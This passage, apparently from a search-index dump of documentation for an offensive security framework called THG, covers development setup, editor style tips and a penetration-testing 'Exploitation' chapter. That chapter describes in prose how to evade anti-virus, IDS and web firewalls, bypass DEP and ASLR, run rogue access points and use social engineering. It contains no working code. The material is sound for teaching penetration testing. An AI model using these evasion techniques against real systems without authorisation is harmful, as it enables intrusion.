Confirm that the PostgreSQL server and client are installed: sudo apt update && sudo apt-get install -y postgresql postgresql-client sudo service postgresql start && sudo update-rc.d postgresql enable 2. Ensure that you are not running as the root user. 3. Initialize the THG database: cd ~/git/THG-framework ./THGdb init 4. If you receive an error about a component not being installed, confirm that the binaries shown are in your path using the [which] and [find] commands, then modifying your [$PATH] environment variable. If it was something else, open a [new issue] to let us know what happened. 5. If the `THGdb init` command succeeds, then confirm that the database is accessible to THG: $ ./THGconsole -qx \"db_status; exit\" Congratulations! You have now set up the [THG Web Service (REST API)][THG-web-service] and the backend database.","title":"Optional: Set up the REST API and PostgreSQL database"},{"location":"dev/thg_dev/Setting_Up_a_THG_Development_Environment/#optional-tips-to-speed-up-common-workflows","text":"The following section is optional but may improve your efficiency. Click to expand. - Making sure you're in the right directory to run `THGconsole` can become tedious, so consider using the following Bash alias: echo 'alias THGconsole=\"pushd $HOME/git/THG-framework && ./THGconsole && popd\"' >> ~/.bash_aliases - Consider generating a GPG key to sign your commits. Read about [why][git-horror] and [how][signing-howto]. - Developers tend to customize their own [git aliases] to speed up common commands, but here are a few common ones: [alias] # An easy, colored oneline log format that shows signed/unsigned status nicelog = log --pretty=format:'%Cred%h%Creset -%Creset %s %Cgreen(%cr) %C(bold blue)<%aE>%Creset [%G?]' # Shorthand commands to always sign (-S) and always edit the commit message. m = merge -S --no-ff --edit c = commit -S --edit # Shorthand to always blame (praise) without looking at whitespace changes b= blame -w - If you plan on working with other contributor's pull requests, you may run the following script which makes it easier to do so: tools/dev/add_pr_fetch.rb After running the above script, you can `checkout` other pull requests more easily: git fetch upstream git checkout fixes-to-pr-12345 upstream/pr/12345 - If you're writing test cases (which you should), then make sure [rspec] works: rake spec You should see over 9000 tests run, mostly resulting in green dots, a few in yellow stars, and no red errors.","title":"Optional: Tips to speed up common workflows"},{"location":"dev/thg_dev/Setting_Up_a_THG_Development_Environment/#great-now-what","text":"We're excited to see your upcoming contributions of new modules, documentation, and fixes! Check out our wiki documentation and, if you're looking for inspiration, keep an eye out for newbie-friendly pull requests and issues . Please submit your new pull requests and reach out to us on Slack for community help. Finally, we welcome your feedback on this guide, so feel free to reach out to us on Slack or open a new issue . For their significant contributions to this guide, we would like to thank @kernelsmith , @corelanc0d3r , and @ffmike .","title":"Great!  Now what?"},{"location":"dev/thg_dev/Style_Tips/","text":"Style Tips Editor configuration Having your editor take care of formatting for you can save headaches during the acceptance process. Most Metasploit contributors use vim and/or gvim as a default text editor -- if you have a configuration for some other editor, we'd love to see it! VIM and GVIM Adding the following settings to your .vimrc will make conforming to the CONTRIBUTING.md and msftidy.rb guidelines considerably easier. Incidentally, if you install the Janus Distribution of vim plugins, this is all done for you, and more, automatically. But, if you are a special snowflake, here's how to limp your way to code formatting excellence. set shiftwidth=2 tabstop=2 softtabstop=2 \" textwidth affects `gq` which is handy for formatting comments set textwidth=78 \" Metasploit requires spaces instead of hard tabs set expandtab \" Highlight spaces at EOL and mixed tabs and spaces. hi BogusWhitespace ctermbg=darkgreen guibg=darkgreen match BogusWhitespace /\\s\\+$\\|^\\t\\+ \\+\\|^ \\+\\t\\+/ If you'd rather these settings only apply to ruby files, you can use an autogroup and autocommands. if !exists(\"au_loaded\") let au_loaded = 1 augroup rb au FileType ruby set shiftwidth=2 tabstop=2 softtabstop=2 textwidth=78 au FileType ruby set expandtab au FileType ruby hi BogusWhitespace ctermbg=darkgreen guibg=darkgreen au FileType ruby match BogusWhitespace /\\s\\+$\\|^\\t\\+ \\+\\|^ \\+\\t\\+/ augroup END endif You can also use :set list to see all whitespace as distinct characters to make it easier to see errant whitespace. Rubymine Given the switch to using standard Ruby indentation, there is no special configuration needed for RubyMine any longer. Two-space tabs for life! Grammar and capitalization While we understand that the world reads many, many languages, Metasploit is developed primarily in U.S English. Therefore, description grammar in modules should adhere to U.S. English conventions. Doing so not only ensures ease of use for the majority of Metasploit users, but also helps automatic (and manual) translators for other languages. Titles Module titles should read like titles. For capitalization rules in English, see: http://owl.english.purdue.edu/owl/resource/592/01/ The only exceptions are function names (like 'thisFunc()') and specific filenames (like thisfile.ocx).","title":"Style_Tips"},{"location":"dev/thg_dev/Style_Tips/#style-tips","text":"","title":"Style Tips"},{"location":"dev/thg_dev/Style_Tips/#editor-configuration","text":"Having your editor take care of formatting for you can save headaches during the acceptance process. Most Metasploit contributors use vim and/or gvim as a default text editor -- if you have a configuration for some other editor, we'd love to see it!","title":"Editor configuration"},{"location":"dev/thg_dev/Style_Tips/#vim-and-gvim","text":"Adding the following settings to your .vimrc will make conforming to the CONTRIBUTING.md and msftidy.rb guidelines considerably easier. Incidentally, if you install the Janus Distribution of vim plugins, this is all done for you, and more, automatically. But, if you are a special snowflake, here's how to limp your way to code formatting excellence. set shiftwidth=2 tabstop=2 softtabstop=2 \" textwidth affects `gq` which is handy for formatting comments set textwidth=78 \" Metasploit requires spaces instead of hard tabs set expandtab \" Highlight spaces at EOL and mixed tabs and spaces. hi BogusWhitespace ctermbg=darkgreen guibg=darkgreen match BogusWhitespace /\\s\\+$\\|^\\t\\+ \\+\\|^ \\+\\t\\+/ If you'd rather these settings only apply to ruby files, you can use an autogroup and autocommands. if !exists(\"au_loaded\") let au_loaded = 1 augroup rb au FileType ruby set shiftwidth=2 tabstop=2 softtabstop=2 textwidth=78 au FileType ruby set expandtab au FileType ruby hi BogusWhitespace ctermbg=darkgreen guibg=darkgreen au FileType ruby match BogusWhitespace /\\s\\+$\\|^\\t\\+ \\+\\|^ \\+\\t\\+/ augroup END endif You can also use :set list to see all whitespace as distinct characters to make it easier to see errant whitespace.","title":"VIM and GVIM"},{"location":"dev/thg_dev/Style_Tips/#rubymine","text":"Given the switch to using standard Ruby indentation, there is no special configuration needed for RubyMine any longer. Two-space tabs for life!","title":"Rubymine"},{"location":"dev/thg_dev/Style_Tips/#grammar-and-capitalization","text":"While we understand that the world reads many, many languages, Metasploit is developed primarily in U.S English. Therefore, description grammar in modules should adhere to U.S. English conventions. Doing so not only ensures ease of use for the majority of Metasploit users, but also helps automatic (and manual) translators for other languages.","title":"Grammar and capitalization"},{"location":"dev/thg_dev/Style_Tips/#titles","text":"Module titles should read like titles. For capitalization rules in English, see: http://owl.english.purdue.edu/owl/resource/592/01/ The only exceptions are function names (like 'thisFunc()') and specific filenames (like thisfile.ocx).","title":"Titles"},{"location":"dev/thg_dev/Using-thg/","text":"Start here: http://www.offensive-security.com/metasploit-unleashed/Main_Page https://metasploit.help.rapid7.com/docs/ http://docs.kali.org/general-use/starting-metasploit-framework-in-kali https://github.com/rapid7/metasploitable3 [[Evading Anti-Virus]] Database troubleshooting If the database is not connecting automatically, first make sure it is running: * Linux: $ netstat -lnt | grep 7337 where 7337 is whatever port you told it to listen on during installation * Windows: look for a postgres.exe process in task manager. If postgres is not running, try starting it manually: * Linux: $ sudo /etc/init.d/metasploit start or if you didn't choose to install as a service: $ sudo /opt/metasploit*/ctlscript.sh start * Windows: Start -> Metasploit -> Services -> Start Services Once postgres is running and listening, go back to msfconsole: ` msf > db_connect","title":"using_thg"},{"location":"dev/thg_dev/Using-thg/#database-troubleshooting","text":"If the database is not connecting automatically, first make sure it is running: * Linux: $ netstat -lnt | grep 7337 where 7337 is whatever port you told it to listen on during installation * Windows: look for a postgres.exe process in task manager. If postgres is not running, try starting it manually: * Linux: $ sudo /etc/init.d/metasploit start or if you didn't choose to install as a service: $ sudo /opt/metasploit*/ctlscript.sh start * Windows: Start -> Metasploit -> Services -> Start Services Once postgres is running and listening, go back to msfconsole: ` msf > db_connect","title":"Database troubleshooting"},{"location":"dev/thg_dev/_Sidebar/","text":"THG-DEV Contents Assumptions Base Packages Fork and Clone python3 pip3 Database Testing Git Aliases THG HACKER GROUP Wiki Pages [[Home]] Welcome to THG! [[Using THG]] A collection of useful links for penetration testers. [[Setting Up a THG Development Environment]] From apt-get install to git push . CONTRIBUTING.md What should your contributions look like? [[Landing Pull Requests]] Working with other people's contributions. [[Using Git]] All about Git and GitHub. [[Contributing to THG]] Be a part of our open source community. [[cybersX]] All about the cybersX payload.","title":"thg_Development_Environment"},{"location":"dev/thg_dev/_Sidebar/#thg-dev-contents","text":"Assumptions Base Packages Fork and Clone python3 pip3 Database Testing Git Aliases","title":"THG-DEV Contents"},{"location":"dev/thg_dev/_Sidebar/#thg-hacker-group-wiki-pages","text":"[[Home]] Welcome to THG! [[Using THG]] A collection of useful links for penetration testers. [[Setting Up a THG Development Environment]] From apt-get install to git push . CONTRIBUTING.md What should your contributions look like? [[Landing Pull Requests]] Working with other people's contributions. [[Using Git]] All about Git and GitHub. [[Contributing to THG]] Be a part of our open source community. [[cybersX]] All about the cybersX payload.","title":"THG HACKER GROUP Wiki Pages"},{"location":"pentest_standard/exploration/","text":"Purpose The exploitation phase of a penetration test focuses solely on establishing access to a system or resource by bypassing security restrictions. If the prior phase, vulnerability analysis was performed properly, this phase should be well planned and a precision strike.. The main focus is to identify the main entry point into the organization and to identify high value target assets. If the vulnerability analysis phase was properly completed, a high value target list should have been complied. Ultimately the attack vector should take into consideration the success probability and highest impact on the organization. Countermeasures Countermeasures are defined as preventative technology or controls that hinder the ability to successfully complete an exploit avenue. This technology could be a Host Based Intrusion Prevention System, Security Guard, Web Application Firewall, or other preventative methods. When performing an exploit, several factors should be taken into consideration. In the event of a preventative technology, a circumvention technique should be considered. In circumstances when this is not possible, alternative exploit methods should be considered. Overall, the purpose is to remain stealth when attacking the organization, if alarms are tripped the level of the assessment could be diminished. If at all possible, the countermeasures should be enumerated prior to triggering the exploit. This could be done through doing dry runs of the attack or enumerating the technology. Anti-Virus Anti-virus is a technology aimed at preventing malicious software from being deployed on the system. As a penetration tester we should be able to identify these types of anti-virus technologies and be able to protect against them. Anti-virus is a small subset of all of the different preventative measures that can be in place, for example host-based intrusion prevention systems, web application firewalls, and other preventative technologies. Encoding Encoding is the method of obfuscating data in a way that makes the deployed piece of code not appear the same. With encoding, the obfuscation occurs usually by scrambling the information and re-arranging in order to hide the fact of what the application is actually doing. Packing Packing is similar to encoding in a sense in that it attempts to re-arrange data to compress the application or \"pack\" it. The hopes of this is that the executable or piece of code being delivered is obfuscated in a manner that it won't be picked up by anti-virus technologies. Encrypting Encrypting, like Encoding and Packing is another method of manipulating the intended runnable code such that it is not recognizable or available for inspection. Only after decrypting in in-memory (with methods similar to packing) the actual code is exposed for the first time - hopefully after security mechanisms have allowed it through and it is executed immediately after it is decrypted. Whitelist Bypass Whitelisting technologies leveraged a trusted model for applications that have been seen on a given system at a time. The technology takes a baseline of the system and identifies what is normal to be run on the system versus what is something foreign. The penetration tester should be able to circumvent whitelist technologies. One of the most common methods is through direct memory access. Whitelisting does not have the capbility of monitoring memory real time and if a memory resident program is running and not touching disk, it can run without being detect by the given technology. Process Injection Process injection is simply the method to inject into an already running process. By injecting into a process, the information of the application can be hidden within a process that would normally be trusted in nature. It's very difficult for preventative measure technology to inspect running processes and can almost always hide in a different process that the application would think is a trusted one. Purely Memory Resident Memory resident attacks are generally the most preferred as most technologies do not inspect memory. As an attacker, finding a way to live in memory purely would be most desirable. When writing to disk, most applications will conduct scans, baselines, and other identifications of potentially maliicous software. The ability to be detected when writing to disk becomes significantly greater. Human When performing exploitation, it is not always the best route to go through a direct exploit or through an application flaw. Sometimes the human element may be a better way to attack an organization. It's important to understand the right attack avenue and make sure that the method we are leveraging is the best route to take. Data Execution Prevention (DEP) When performing exploitation, many preventative measures canc ome into play. Data Execution Prevention is a defensive measure implemented into most operating systems and prevents execute permission when an overwrite in memory has occurred. The thought process behind DEP is to stop an attacker in rewriting memory and then executing that code. There are mulitple methods to bypass data execution prevention and discussed later in the the exploitation phase of PTES. Address Space Layout Randomization During a buffer overflow vulnerability (or that of anything where we control memory), memory addresses are hardcoded in order redirect execution flow to our shellcode. In the event of ASLR, certain bytes are randomized in order to prevent an attacker from predicting where he/she can always go to in order to execute shellcode. Web Application Firewall (WAF) Web application firewalls are a technology that sits inline with an application in order to protect against web-based application attacks. Web application firewalls attempt to identify potentially dangerous or malforms attacked towards a given web applciation and prevent them. There are a number of bypass techniques for web application firewalls and should be tested during the penetration test. Evasion Evasion is the technique used in order to escape detection during a penetration test. This could be circumventing a camera system as to not be seen by a guard, obfuscating your payloads to evade Intrusion Detection Systems (IDS) or Intrusion Prevention Systems (IPS) or encoding requests/responses to circumvent web application firewalls. Overall, the need to identify a low risk scenario for evading a technology or person should be formulated prior to the exploit. Precision Strike The main focus of a penetration test is to simulate an attacker in order to represent a simulated attack against the organization. The value brought through a penetration test is generally not through smash and grab techniques where the attacks are noisy in nature and in an attempt to try every exploit. This approach may be particularly useful at the end of a penetration test to gauge the level of incident response from the organization, but in most cases the exploitation phase is a accumulation of specific research on the target. Customized Exploitation Avenue Every attack will typically not be the same in how the exploitation avenue occurs. In order to be successful in this phase, the attack should be tailored and customized based on the scenario. For example, if a wireless penetration test is occurred, and a specific technology is in use, these need to be identified and attacked based on what technologies are in place. Having a clear understanding of each scenario and the applicability of an exploit is one of the most important aspects of this phase of the penetration test. Tailored Exploits In a number of occasions the exploits that are public on the Internet may need some work in order to successfully complete. In most cases, if an exploit is designed for Windows XP SP2, specific modifications to the exploit will be required in order for the attack to be successful via Windows XP SP3. The penetration tester should have the knowledge in place to be able to customize an exploit and the ability to change on the fly in order to successfully complete the attack. Exploit Customization In the event of an attack, it is often required to simulate the victims infrastructure in order to ensure that the exploitation phase will be successful. The techniques leveraged in the information gathering phase can always help assist in that however, having a working infrastructure and systems in place will make the expliotation phase much easier. In the event of a tailored exploit, the penetration tester should be able to customize already public exploits in order to successfully attack a system. A common theme for exploits is to target specific versions of operating systems or applications. The reason for this is due to memory addresses changing based on service packs, and/or new versions of the operating system. The tester should be able to customize these exploits to successfully deploy to different operating systems and successfully compromise the system. Zero-Day Angle In most cases, the zero-day angle is often a last resort for most penetration testers. This type of attack often represents a highly advanced organization that can handle a focused attack against the organization through normal attack methods. In certain scenarios research may be conducted in order to reverse engineer, fuzz, or perform advanced discovery of vulnerabilities that have not been discovered. In the event this type of attack is applicable, ensure that the environment to the best of the attackers knowledge is reproduced to include countermeasure technology. In order for zero-day exploits to be successful (or any exploit for that matter), having the same operating system, patches, and countermeasures is highly important on success. Sometimes this information may not be available based on the level of access or enumeration that has occurred. Fuzzing Fuzzing is the ability to recreate a protocol or application and attempt to send data at the application in hopes of identification of a vulnerability. Often times the hopes of a fuzzer is to identify a crash in an application and craft a specific exploit out of it. In the case of fuzzing, the attacker is attempting to create a specific vulnerability out of something that hasn't been discovered before. As part of a penetration test, if no avenues are identified during the engagement, or the engagement calls for zero-day research; fuzzing techniques should be leveraged in order to identify potentially vulnerable exposures. Source Code Analysis Other avenues that a penetration tester has available is if the source code is available or open-source. If the tester has the ability to look at the source code and identify flaws within the application, zero day exposures can also be identified through these methods. Types of Exploits There are several types of exploits that can be identified during a penetration test that could be classified as a zero-day. Some are listed in this section. Buffer Overflows Buffer overflows occur due to improper coding techniques. Specifically this usually occurs when a program writes data to a buffer and then overruns the buffer's boundary and begins to overwrite portions of memory. In buffer overflow exploits the attackers goal is to control a crash and gain code execution on the given system. In a buffer overflow exploit, one of the more common techniques is to overwrite a given register and \"jump\" to the shellcode. SEH Overwrites SEH overwrites occur when the structured exception handler begins to gracefully close an application. The attacker can manipulate how SEH works, overwrite the base address of the SEH handler and gain control of execution flow through the SEH. This is a common attack leveraged with buffer overflow vulnerability and applications that have been complied with SEH. Return Oriented Programming Return Oriented Programming (ROP) is a technique used during a portion where the user has control of execution flow however data execution prevention (DEP) or other precluding defense mechanisms may be in place. In the situation where DEP is enabled, the attacker does not have direct access to execute specific assembly instructions, therefor the attacker buildsa ROP gadget in order to prep certain Windows API calls or techniques to disable DEP or circumvent DEP. A common method is leveraging the WriteProcessMemory call to copy data from the stack into a writable memory space that can then be executed. Traffic Analysis Traffic analysis is the technique of identifying what type of information is being sent and the ability to understand and manipulate that traffic. A penetration tester should be able to understand how a protocol works and how it can be manipulated in order to leverage an attack. Physical Access Physical access during a penetration test can be a viable attack method for attempting to circumvent physical security controls and gain unauthorized access. During a penetration test, the assessor should be able to identify potentially flawed physical security controls and attempt to gain access to the facility if within scope. Human Angle During a physical penetration test, some of the most obvious ways would be to social-engineer your way into the facility and gain access. This requires significant knowledge of how the organization performs business, and everything you learned from the intelligence gathering phase. PC Access If physical access is granted to a PC, the penetration tester should be able to attack the PC and gain access through multiple methods that would allow access to the system. Proximity Access (WiFi) Wireless communications are an avenue for attacks to gain access through RF type communications. The penetration tester should view the FCC radio frequency list to see if the target has registered spectrum frequencies in use. WiFi Attacks Regardless of protocol, there are a number of attacks available for WEP, WPA, WPA2, EAP-FAST, EAP-LEAP, and other avenues. The attacker should be familiar with the various encryption protocols and standards and be able to effectively test the implementation around the controls put in place. Attacking the User Leveraging rogue access points in order to attack the victim is often a beneficial and a viable attack method. Leveraging a rogue access point to entice victims in order to leverage exploits or steal sensitive information should be performed during a wireless assessment. There are several common techniques in use of this, but most commonly the attacker would setup a wireless access point with the same name or an enticing name in order for the victim to connect. Example Avenues of Attack In any scenario, the attacks should consist based on the scenario that is within scope of the engagement. Below is a list of several attack avenues to consider based on scenario but is by no means a comprehensive list. Web Application Attacks Social-Engineering Physical Attack Avenues Memory Based Exploits (i.e. buffer/heap overflows, memory corruptions, use-after-free). Man in the Middle VLAN Hopping USB/Flash Drive deployment Reverse Engineering Zero-Day Angle Attacking the user Encryption Cracking Graphics Processing Unit (GPU) Cracking Traffic Analysis Firewire Routing protocols Phishing with Pretexting Employee Impersonation Again, these examples are only basic avenues for attack based on the scenario you are performing for the organization. The value from a penetration test comes from creativity and the ability to identify exposures and exploit them in a precise manner. Overall Objective In the pre-engagement interaction phase with the customer, a clear definition of the overall objectives of the penetration test should have been communicated. In the case of the exploitation phase, the biggest challenge is identifying the least path of resistance into the organization without detection and having the most impact on the organizations ability to generate revenue. By performing the prior phases properly, a clear understanding of how the organization functions and makes money should be relatively understood. From the exploitation phase and into the post-exploitation phase, the attack vectors should rely solely on the mission of circumventing security controls in order to represent how the organization can suffer substantial losses through a targeted attack against the organization.","title":"Exploitation"},{"location":"pentest_standard/exploration/#purpose","text":"The exploitation phase of a penetration test focuses solely on establishing access to a system or resource by bypassing security restrictions. If the prior phase, vulnerability analysis was performed properly, this phase should be well planned and a precision strike.. The main focus is to identify the main entry point into the organization and to identify high value target assets. If the vulnerability analysis phase was properly completed, a high value target list should have been complied. Ultimately the attack vector should take into consideration the success probability and highest impact on the organization.","title":"Purpose"},{"location":"pentest_standard/exploration/#countermeasures","text":"Countermeasures are defined as preventative technology or controls that hinder the ability to successfully complete an exploit avenue. This technology could be a Host Based Intrusion Prevention System, Security Guard, Web Application Firewall, or other preventative methods. When performing an exploit, several factors should be taken into consideration. In the event of a preventative technology, a circumvention technique should be considered. In circumstances when this is not possible, alternative exploit methods should be considered. Overall, the purpose is to remain stealth when attacking the organization, if alarms are tripped the level of the assessment could be diminished. If at all possible, the countermeasures should be enumerated prior to triggering the exploit. This could be done through doing dry runs of the attack or enumerating the technology.","title":"Countermeasures"},{"location":"pentest_standard/exploration/#anti-virus","text":"Anti-virus is a technology aimed at preventing malicious software from being deployed on the system. As a penetration tester we should be able to identify these types of anti-virus technologies and be able to protect against them. Anti-virus is a small subset of all of the different preventative measures that can be in place, for example host-based intrusion prevention systems, web application firewalls, and other preventative technologies.","title":"Anti-Virus"},{"location":"pentest_standard/exploration/#encoding","text":"Encoding is the method of obfuscating data in a way that makes the deployed piece of code not appear the same. With encoding, the obfuscation occurs usually by scrambling the information and re-arranging in order to hide the fact of what the application is actually doing.","title":"Encoding"},{"location":"pentest_standard/exploration/#packing","text":"Packing is similar to encoding in a sense in that it attempts to re-arrange data to compress the application or \"pack\" it. The hopes of this is that the executable or piece of code being delivered is obfuscated in a manner that it won't be picked up by anti-virus technologies.","title":"Packing"},{"location":"pentest_standard/exploration/#encrypting","text":"Encrypting, like Encoding and Packing is another method of manipulating the intended runnable code such that it is not recognizable or available for inspection. Only after decrypting in in-memory (with methods similar to packing) the actual code is exposed for the first time - hopefully after security mechanisms have allowed it through and it is executed immediately after it is decrypted.","title":"Encrypting"},{"location":"pentest_standard/exploration/#whitelist-bypass","text":"Whitelisting technologies leveraged a trusted model for applications that have been seen on a given system at a time. The technology takes a baseline of the system and identifies what is normal to be run on the system versus what is something foreign. The penetration tester should be able to circumvent whitelist technologies. One of the most common methods is through direct memory access. Whitelisting does not have the capbility of monitoring memory real time and if a memory resident program is running and not touching disk, it can run without being detect by the given technology.","title":"Whitelist Bypass"},{"location":"pentest_standard/exploration/#process-injection","text":"Process injection is simply the method to inject into an already running process. By injecting into a process, the information of the application can be hidden within a process that would normally be trusted in nature. It's very difficult for preventative measure technology to inspect running processes and can almost always hide in a different process that the application would think is a trusted one.","title":"Process Injection"},{"location":"pentest_standard/exploration/#purely-memory-resident","text":"Memory resident attacks are generally the most preferred as most technologies do not inspect memory. As an attacker, finding a way to live in memory purely would be most desirable. When writing to disk, most applications will conduct scans, baselines, and other identifications of potentially maliicous software. The ability to be detected when writing to disk becomes significantly greater.","title":"Purely Memory Resident"},{"location":"pentest_standard/exploration/#human","text":"When performing exploitation, it is not always the best route to go through a direct exploit or through an application flaw. Sometimes the human element may be a better way to attack an organization. It's important to understand the right attack avenue and make sure that the method we are leveraging is the best route to take.","title":"Human"},{"location":"pentest_standard/exploration/#data-execution-prevention-dep","text":"When performing exploitation, many preventative measures canc ome into play. Data Execution Prevention is a defensive measure implemented into most operating systems and prevents execute permission when an overwrite in memory has occurred. The thought process behind DEP is to stop an attacker in rewriting memory and then executing that code. There are mulitple methods to bypass data execution prevention and discussed later in the the exploitation phase of PTES.","title":"Data Execution Prevention (DEP)"},{"location":"pentest_standard/exploration/#address-space-layout-randomization","text":"During a buffer overflow vulnerability (or that of anything where we control memory), memory addresses are hardcoded in order redirect execution flow to our shellcode. In the event of ASLR, certain bytes are randomized in order to prevent an attacker from predicting where he/she can always go to in order to execute shellcode.","title":"Address Space Layout Randomization"},{"location":"pentest_standard/exploration/#web-application-firewall-waf","text":"Web application firewalls are a technology that sits inline with an application in order to protect against web-based application attacks. Web application firewalls attempt to identify potentially dangerous or malforms attacked towards a given web applciation and prevent them. There are a number of bypass techniques for web application firewalls and should be tested during the penetration test.","title":"Web Application Firewall (WAF)"},{"location":"pentest_standard/exploration/#evasion","text":"Evasion is the technique used in order to escape detection during a penetration test. This could be circumventing a camera system as to not be seen by a guard, obfuscating your payloads to evade Intrusion Detection Systems (IDS) or Intrusion Prevention Systems (IPS) or encoding requests/responses to circumvent web application firewalls. Overall, the need to identify a low risk scenario for evading a technology or person should be formulated prior to the exploit.","title":"Evasion"},{"location":"pentest_standard/exploration/#precision-strike","text":"The main focus of a penetration test is to simulate an attacker in order to represent a simulated attack against the organization. The value brought through a penetration test is generally not through smash and grab techniques where the attacks are noisy in nature and in an attempt to try every exploit. This approach may be particularly useful at the end of a penetration test to gauge the level of incident response from the organization, but in most cases the exploitation phase is a accumulation of specific research on the target.","title":"Precision Strike"},{"location":"pentest_standard/exploration/#customized-exploitation-avenue","text":"Every attack will typically not be the same in how the exploitation avenue occurs. In order to be successful in this phase, the attack should be tailored and customized based on the scenario. For example, if a wireless penetration test is occurred, and a specific technology is in use, these need to be identified and attacked based on what technologies are in place. Having a clear understanding of each scenario and the applicability of an exploit is one of the most important aspects of this phase of the penetration test.","title":"Customized Exploitation Avenue"},{"location":"pentest_standard/exploration/#tailored-exploits","text":"In a number of occasions the exploits that are public on the Internet may need some work in order to successfully complete. In most cases, if an exploit is designed for Windows XP SP2, specific modifications to the exploit will be required in order for the attack to be successful via Windows XP SP3. The penetration tester should have the knowledge in place to be able to customize an exploit and the ability to change on the fly in order to successfully complete the attack.","title":"Tailored Exploits"},{"location":"pentest_standard/exploration/#exploit-customization","text":"In the event of an attack, it is often required to simulate the victims infrastructure in order to ensure that the exploitation phase will be successful. The techniques leveraged in the information gathering phase can always help assist in that however, having a working infrastructure and systems in place will make the expliotation phase much easier. In the event of a tailored exploit, the penetration tester should be able to customize already public exploits in order to successfully attack a system. A common theme for exploits is to target specific versions of operating systems or applications. The reason for this is due to memory addresses changing based on service packs, and/or new versions of the operating system. The tester should be able to customize these exploits to successfully deploy to different operating systems and successfully compromise the system.","title":"Exploit Customization"},{"location":"pentest_standard/exploration/#zero-day-angle","text":"In most cases, the zero-day angle is often a last resort for most penetration testers. This type of attack often represents a highly advanced organization that can handle a focused attack against the organization through normal attack methods. In certain scenarios research may be conducted in order to reverse engineer, fuzz, or perform advanced discovery of vulnerabilities that have not been discovered. In the event this type of attack is applicable, ensure that the environment to the best of the attackers knowledge is reproduced to include countermeasure technology. In order for zero-day exploits to be successful (or any exploit for that matter), having the same operating system, patches, and countermeasures is highly important on success. Sometimes this information may not be available based on the level of access or enumeration that has occurred.","title":"Zero-Day Angle"},{"location":"pentest_standard/exploration/#fuzzing","text":"Fuzzing is the ability to recreate a protocol or application and attempt to send data at the application in hopes of identification of a vulnerability. Often times the hopes of a fuzzer is to identify a crash in an application and craft a specific exploit out of it. In the case of fuzzing, the attacker is attempting to create a specific vulnerability out of something that hasn't been discovered before. As part of a penetration test, if no avenues are identified during the engagement, or the engagement calls for zero-day research; fuzzing techniques should be leveraged in order to identify potentially vulnerable exposures.","title":"Fuzzing"},{"location":"pentest_standard/exploration/#source-code-analysis","text":"Other avenues that a penetration tester has available is if the source code is available or open-source. If the tester has the ability to look at the source code and identify flaws within the application, zero day exposures can also be identified through these methods.","title":"Source Code Analysis"},{"location":"pentest_standard/exploration/#types-of-exploits","text":"There are several types of exploits that can be identified during a penetration test that could be classified as a zero-day. Some are listed in this section.","title":"Types of Exploits"},{"location":"pentest_standard/exploration/#buffer-overflows","text":"Buffer overflows occur due to improper coding techniques. Specifically this usually occurs when a program writes data to a buffer and then overruns the buffer's boundary and begins to overwrite portions of memory. In buffer overflow exploits the attackers goal is to control a crash and gain code execution on the given system. In a buffer overflow exploit, one of the more common techniques is to overwrite a given register and \"jump\" to the shellcode.","title":"Buffer Overflows"},{"location":"pentest_standard/exploration/#seh-overwrites","text":"SEH overwrites occur when the structured exception handler begins to gracefully close an application. The attacker can manipulate how SEH works, overwrite the base address of the SEH handler and gain control of execution flow through the SEH. This is a common attack leveraged with buffer overflow vulnerability and applications that have been complied with SEH.","title":"SEH Overwrites"},{"location":"pentest_standard/exploration/#return-oriented-programming","text":"Return Oriented Programming (ROP) is a technique used during a portion where the user has control of execution flow however data execution prevention (DEP) or other precluding defense mechanisms may be in place. In the situation where DEP is enabled, the attacker does not have direct access to execute specific assembly instructions, therefor the attacker buildsa ROP gadget in order to prep certain Windows API calls or techniques to disable DEP or circumvent DEP. A common method is leveraging the WriteProcessMemory call to copy data from the stack into a writable memory space that can then be executed.","title":"Return Oriented Programming"},{"location":"pentest_standard/exploration/#traffic-analysis","text":"Traffic analysis is the technique of identifying what type of information is being sent and the ability to understand and manipulate that traffic. A penetration tester should be able to understand how a protocol works and how it can be manipulated in order to leverage an attack.","title":"Traffic Analysis"},{"location":"pentest_standard/exploration/#physical-access","text":"Physical access during a penetration test can be a viable attack method for attempting to circumvent physical security controls and gain unauthorized access. During a penetration test, the assessor should be able to identify potentially flawed physical security controls and attempt to gain access to the facility if within scope.","title":"Physical Access"},{"location":"pentest_standard/exploration/#human-angle","text":"During a physical penetration test, some of the most obvious ways would be to social-engineer your way into the facility and gain access. This requires significant knowledge of how the organization performs business, and everything you learned from the intelligence gathering phase.","title":"Human Angle"},{"location":"pentest_standard/exploration/#pc-access","text":"If physical access is granted to a PC, the penetration tester should be able to attack the PC and gain access through multiple methods that would allow access to the system.","title":"PC Access"},{"location":"pentest_standard/exploration/#proximity-access-wifi","text":"Wireless communications are an avenue for attacks to gain access through RF type communications. The penetration tester should view the FCC radio frequency list to see if the target has registered spectrum frequencies in use.","title":"Proximity Access (WiFi)"},{"location":"pentest_standard/exploration/#wifi-attacks","text":"Regardless of protocol, there are a number of attacks available for WEP, WPA, WPA2, EAP-FAST, EAP-LEAP, and other avenues. The attacker should be familiar with the various encryption protocols and standards and be able to effectively test the implementation around the controls put in place.","title":"WiFi Attacks"},{"location":"pentest_standard/exploration/#attacking-the-user","text":"Leveraging rogue access points in order to attack the victim is often a beneficial and a viable attack method. Leveraging a rogue access point to entice victims in order to leverage exploits or steal sensitive information should be performed during a wireless assessment. There are several common techniques in use of this, but most commonly the attacker would setup a wireless access point with the same name or an enticing name in order for the victim to connect.","title":"Attacking the User"},{"location":"pentest_standard/exploration/#example-avenues-of-attack","text":"In any scenario, the attacks should consist based on the scenario that is within scope of the engagement. Below is a list of several attack avenues to consider based on scenario but is by no means a comprehensive list. Web Application Attacks Social-Engineering Physical Attack Avenues Memory Based Exploits (i.e. buffer/heap overflows, memory corruptions, use-after-free). Man in the Middle VLAN Hopping USB/Flash Drive deployment Reverse Engineering Zero-Day Angle Attacking the user Encryption Cracking Graphics Processing Unit (GPU) Cracking Traffic Analysis Firewire Routing protocols Phishing with Pretexting Employee Impersonation Again, these examples are only basic avenues for attack based on the scenario you are performing for the organization. The value from a penetration test comes from creativity and the ability to identify exposures and exploit them in a precise manner.","title":"Example Avenues of Attack"},{"location":"pentest_standard/exploration/#overall-objective","text":"In the pre-engagement interaction phase with the customer, a clear definition of the overall objectives of the penetration test should have been communicated. In the case of the exploitation phase, the biggest challenge is identifying the least path of resistance into the organization without detection and having the most impact on the organizations ability to generate revenue. By performing the prior phases properly, a clear understanding of how the organization functions and makes money should be relatively understood. From the exploitation phase and into the post-exploitation phase, the attack vectors should rely solely on the mission of circumventing security controls in order to represent how the organization can suffer substantial losses through a targeted attack against the organization.","title":"Overall Objective"},{"location":"pentest_standard/ig/","text":"General This section 